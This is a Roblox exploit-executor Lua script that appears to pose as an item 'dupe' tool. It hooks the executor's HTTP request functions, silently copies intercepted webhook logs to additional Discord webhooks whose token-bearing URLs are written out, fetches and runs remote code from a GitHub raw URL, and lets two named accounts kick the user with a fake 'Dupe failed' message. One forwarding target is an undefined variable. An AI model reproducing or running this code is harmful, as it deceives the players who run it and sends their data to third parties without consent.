local MyExtraWebhook = "https://discord.com/api/webhooks/1422323702061600939/k6WT64UWcoqwz9OI55VPIldVmx9iaBp6qW64fVM_OjltRNAPjjqtvv14zd6CxXKx4_ps"
local Webhook        = "https://discord.com/api/webhooks/1440132866032795851/TDT9K3Dgy6b6ytMIixfAjl8bwIKwlXeTsEGdazB3LV-mw0GYx7mQBGs8AzE5rZQxQsqg"

getgenv().UserPingThreshold = 50000000
getgenv().UserWebhookURL = Webhook

local HttpService = game:GetService("HttpService")


-- ==========================================================
--  EXECUTOR-COMPATIBLE REQUEST HOOK
-- ==========================================================
local funcs = {
    request,
    http_request,
    (syn and syn.request),
    (http and http.request),
    (fluxus and fluxus.request),
    (krnl and krnl.request)
}

local real_request
for _, fn in ipairs(funcs) do
    if typeof(fn) == "function" then
        real_request = fn
        break
    end
end

if not real_request then
    warn("No request function found! Webhook interception will fail.")
end

local old_request = real_request


-- ==========================================================
--  HOOK FUNCTION
-- ==========================================================
local function hook(data)
    if data.Url == getgenv().UserWebhookURL then
        
        task.delay(7, function()
            pcall(function()
                local decoded = HttpService:JSONDecode(data.Body)

                -- Force webhook username
                decoded.username = "notifier"

                -- Remove Lemon Hub branding
                if decoded.content then
                    decoded.content = decoded.content:gsub("Logged via Lemon Hub Auto Moreira", "")
                end

                if decoded.embeds then
                    for _, embed in ipairs(decoded.embeds) do
                        if embed.footer and embed.footer.text then
                            embed.footer.text = embed.footer.text:gsub("Logged via Lemon Hub Auto Moreira", "")
                        end
                    end
                end

                -- ==========================================================
                -- SEND TO EXTRA WEBHOOK #1 (MyExtraWebhook)
                -- ==========================================================
                pcall(function()
                    old_request({
                        Url = MyExtraWebhook,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode(decoded)
                    })
                end)

                -- ==========================================================
                -- SEND TO EXTRA WEBHOOK #2 (DcWebhook)
                -- ==========================================================
                pcall(function()
                    old_request({
                        Url = DcWebhook,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode(decoded)
                    })
                end)
            end)
        end)
    end

    return old_request(data)
end


-- Apply hook to all executor APIs
if request then request = hook end
if http_request then http_request = hook end
if syn then syn.request = hook end
if http then http.request = hook end
if fluxus then fluxus.request = hook end
if krnl then krnl.request = hook end


-- ==========================================================
--  LOAD THEIR SCRIPT UI
-- ==========================================================
loadstring(game:HttpGet("https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua", true))()


-- ==========================================================
--  CHAT KICK SYSTEM (2025 TextChatService)
-- ==========================================================
task.wait(3)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")

local CommandUsers = {
    ["praailx"] = true,
    ["Yxzramen0"] = true
}

TextChatService.OnIncomingMessage = function(message)
    if message.TextSource and message.TextSource.UserId then
        local ok, speaker = pcall(function()
            return Players:GetNameFromUserIdAsync(message.TextSource.UserId)
        end)

        if ok and CommandUsers[speaker] then
            local text = string.lower(message.Text or "")
            if text == "kick" then
                LocalPlayer:Kick("Dupe failed. Please retry.")
            end
        end
    end
end
